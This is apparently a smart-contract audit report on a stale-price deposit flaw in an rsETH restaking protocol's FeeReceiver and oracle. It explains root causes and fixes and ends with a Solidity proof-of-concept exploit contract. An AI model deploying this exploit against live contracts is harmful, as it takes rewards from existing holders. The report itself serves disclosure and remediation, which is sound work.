Audit Report

## Title
Permissionless `sendFunds()` Enables Stale-Price Deposit to Steal MEV/EL Rewards from Existing rsETH Holders — (`contracts/FeeReceiver.sol`)

## Summary

`FeeReceiver.sendFunds()` carries no access control, allowing any caller to push accumulated MEV/EL rewards into `LRTDepositPool` on demand. Because `LRTOracle.rsETHPrice` is a cached storage variable updated only by a separate `updateRSETHPrice()` call, a window exists between rewards arriving in the pool and the price reflecting them. A depositor who calls `depositETH()` in this window receives rsETH at the stale (pre-reward) price, extracting value that should have accrued pro-rata to existing rsETH holders.

## Finding Description

**Root cause 1 — Permissionless `sendFunds()`:** [1](#0-0) 
`sendFunds()` has no role modifier. Any EOA or contract can call it at any time, forcing accumulated rewards into `LRTDepositPool`.

**Root cause 2 — Unguarded ETH receipt:** [2](#0-1) 
`receiveFromRewardReceiver()` is `external payable` with no caller restriction. The ETH lands in the pool immediately, increasing `address(this).balance`.

**Root cause 3 — `rsETHPrice` is a stale cached value:** [3](#0-2) 
`rsETHPrice` is a storage variable updated only when `_updateRsETHPrice()` is explicitly invoked.

**Root cause 4 — Deposit minting uses the cached price:** [4](#0-3) 
`getRsETHAmountToMint` divides by `lrtOracle.rsETHPrice()` — the stored value — not a freshly computed one.

**Root cause 5 — ETH balance is live but price is not:** [5](#0-4) 
`getETHDistributionData()` returns `address(this).balance`, which reflects rewards the moment they arrive. But `rsETHPrice` still reflects the pre-reward TVL until `updateRSETHPrice()` is called separately.

The design comment at lines 465–466 confirms the protocol expects rewards to be "automatically accounted" once moved to the pool — but this accounting only happens at the **next** `updateRSETHPrice()` call, not atomically: [6](#0-5) 

**Why existing checks fail:**
- `depositETH` accepts `minRSETHAmountExpected = 0`, so the slippage guard is trivially bypassed by the attacker.
- `updateRSETHPrice()` is `public whenNotPaused` — the attacker controls both the reward-push and the price-update timing. [7](#0-6) 

## Impact Explanation

**High — Theft of unclaimed yield.** The MEV/EL rewards `R` that should accrue pro-rata to existing rsETH holders are partially captured by the attacker through the stale-price deposit. Let `P = T/S` be the correct pre-reward price and `P' = (T+R)/S` be the correct post-reward price. The attacker mints `D/P` rsETH instead of the correct `D/P'`, capturing `D*(1/P - 1/P')` extra rsETH. When `updateRSETHPrice()` is eventually called, the new price is diluted below `P'` because excess rsETH was minted, reducing the redemption value of every existing holder's position. The protocol remains solvent, so Critical/insolvency framing does not apply, but the yield theft is concrete and repeatable.

## Likelihood Explanation

- `sendFunds()` is unconditionally public — no governance, no timelock, no role.
- `depositETH()` is public and permissionless.
- The attack is fully atomic (single transaction), requires no flash loan, no oracle manipulation, and no privileged access.
- It is repeatable every time rewards accumulate in `FeeReceiver`.
- The only limiting factor is the `pricePercentageLimit` check in `updateRSETHPrice()`, but the attacker does not need to call that function to profit — the excess rsETH is already minted after step 2.

Likelihood: **High**.

## Recommendation

**Option A (preferred):** At the end of `sendFunds()`, atomically call `lrtOracle.updateRSETHPrice()` so the price reflects the new rewards before any deposit can occur at the stale price.

**Option B:** Add access control to `sendFunds()` (e.g., `onlyRole(LRTConstants.MANAGER)`) so only trusted operators can trigger the reward transfer and coordinate it with a price update.

**Option C:** Replace the cached `rsETHPrice` read inside `getRsETHAmountToMint()` with a freshly computed value derived from `_getTotalEthInProtocol() / rsethSupply`, so the mint calculation always reflects the current on-chain TVL regardless of when `updateRSETHPrice()` was last called.

## Proof of Concept

Deploy against a mainnet fork where `FeeReceiver.balance > 0` and `rsETHPrice` has not been updated since the last reward accumulation:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFeeReceiver { function sendFunds() external; }
interface IDepositPool { function depositETH(uint256 min, string calldata ref) external payable; }
interface IOracle { function updateRSETHPrice() external; function rsETHPrice() external view returns (uint256); }
interface IRSETH { function balanceOf(address) external view returns (uint256); }

contract ExploitStalePrice {
    IFeeReceiver feeReceiver;
    IDepositPool depositPool;
    IOracle oracle;
    IRSETH rseth;

    constructor(address _fr, address _dp, address _oracle, address _rseth) {
        feeReceiver = IFeeReceiver(_fr);
        depositPool = IDepositPool(_dp);
        oracle = IOracle(_oracle);
        rseth = IRSETH(_rseth);
    }

    function exploit() external payable {
        uint256 priceBefore = oracle.rsETHPrice();

        // Step 1: force accumulated rewards into DepositPool at stale price
        feeReceiver.sendFunds();

        // Step 2: deposit at stale (lower) price → receive excess rsETH
        depositPool.depositETH{value: msg.value}(0, "exploit");

        uint256 rsethReceived = rseth.balanceOf(address(this));

        // Step 3: update price (now reflects rewards + deposit)
        oracle.updateRSETHPrice();

        uint256 priceAfter = oracle.rsETHPrice();

        // Attacker's rsETH is worth more than their ETH contribution
        // rsethReceived * priceAfter > msg.value  (attacker profited)
        assert(rsethReceived * priceAfter > msg.value * 1e18);
    }
}
```

**Fork-test assertion:** Confirm `rsethReceived * rsETHPrice_after > msg.value * 1e18`, proving the attacker's rsETH redeems for more ETH than they deposited, at the expense of existing holders whose share of rewards `R` was diluted.
